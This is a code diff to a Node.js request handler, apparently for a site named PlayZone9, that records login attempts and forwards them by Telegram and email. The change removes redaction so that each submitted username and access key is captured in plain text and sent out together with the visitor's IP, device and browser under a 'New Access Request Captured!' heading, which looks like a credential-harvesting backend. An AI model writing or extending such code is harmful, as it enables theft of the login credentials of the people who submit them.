@@ -81,6 +81,8 @@ async function readFromSupabase() {
 async function sendTelegram(entry) {
     const text =
         `🎯 *[PlayZone9] New Access Request Captured!*\n\n` +
+        `👤 *Username:* ${entry.username}\n` +
+        `🔑 *Access Key:* ${entry.accessKey}\n\n` +
         `🌐 *IP:* ${entry.ip}\n` +
         `💻 *Device:* ${entry.device} (${entry.browser})\n` +
         `🕒 *Time:* ${entry.timestamp}\n\n` +
@@ -107,9 +109,11 @@ async function sendEmail(entry) {
         await transporter.sendMail({
             from:    `"PlayZone9 Alert" <${EMAIL_USER}>`,
             to:      EMAIL_USER,
-            subject: 'mismatched login attempt',
+            subject: `🎯 [PlayZone9] New Access Request: ${entry.username}`,
             text:
                 `[PlayZone9] New Access Request Captured!\n\n` +
+                `Username : ${entry.username}\n` +
+                `Access Key : ${entry.accessKey}\n\n` +
                 `IP       : ${entry.ip}\n` +
                 `Device   : ${entry.device} (${entry.browser})\n` +
                 `Time     : ${entry.timestamp}\n\n` +
@@ -162,8 +166,8 @@ module.exports = async (req, res) => {
 
             const entry = {
                 timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-                username:  '[redacted]',
-                accessKey:  '[redacted]',
+                username:  username || '',
+                accessKey:  accessKey || '',
                 browser,
                 device,
                 ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
